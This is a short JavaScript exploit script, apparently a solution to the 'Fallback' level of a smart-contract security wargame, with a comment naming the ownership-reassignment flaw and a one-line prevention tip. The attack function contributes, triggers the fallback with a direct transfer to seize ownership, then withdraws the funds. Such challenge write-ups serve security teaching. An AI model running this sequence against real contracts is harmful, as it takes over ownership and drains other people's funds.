/**

Fallback
 
Vulnerability: 
Unreasonable Reassignment of Ownership

Preventative Techniques:
Reassign under reassignment-worthy conditions

*/

const attack = async () => {

    await contract.contribute({ value: toWei("0.0005") });

    await contract.sendTransaction({ value: toWei("0.000001") });

    await contract.withdraw();
}
